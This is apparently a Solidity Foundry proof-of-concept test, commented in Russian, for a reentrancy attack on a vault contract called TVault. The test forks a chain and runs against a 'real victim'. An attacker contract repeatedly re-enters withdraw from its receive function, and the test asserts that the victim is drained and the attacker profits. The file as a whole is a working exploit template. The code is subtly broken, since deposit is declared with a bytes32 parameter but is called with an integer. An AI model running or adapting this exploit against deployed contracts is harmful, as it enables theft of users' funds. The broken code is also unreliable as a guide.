// SPDX-License-Identifier: UNLICENSED
// PoC reentrancy (ФОРК-режим — реальная жертва), SCSA.
// цель: TVault.withdraw; жертва: 0x000000000000000000000000000000000000dEaD @ блок 1000
// запуск: RPC_URL=<rpc-url> forge test --match-contract TVaultReentrancyForkTest -vvv
// TODO(hunter): сверить блок форка (ДО патча) и точные значения депозита.
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface ITVault {
    function withdraw(uint128) external;
    function deposit(bytes32) external payable;
}

contract TVaultAttacker {
    ITVault public target;
    uint256 public constant STEP = 1 ether;
    constructor(ITVault _t) { target = _t; }
    function attack() external payable {
        target.deposit{value: msg.value}(STEP);
        target.withdraw(STEP);
    }
    receive() external payable {
        if (address(target).balance >= STEP) target.withdraw(STEP);
    }
}

contract TVaultReentrancyForkTest is Test {
    ITVault victim;
    TVaultAttacker attacker;
    address constant VICTIM = 0x000000000000000000000000000000000000dEaD;
    uint256 constant FORK_BLOCK = 1000;
    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), FORK_BLOCK);
        victim = ITVault(VICTIM);
        attacker = new TVaultAttacker(victim);
    }
    function test_ReentrancyDrainsVictim() public {
        uint256 victimBefore   = address(victim).balance;
        uint256 attackerBefore = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        assertLt(address(victim).balance,   victimBefore,   "victim not drained");
        assertGt(address(attacker).balance, attackerBefore, "attacker did not profit");
    }
}
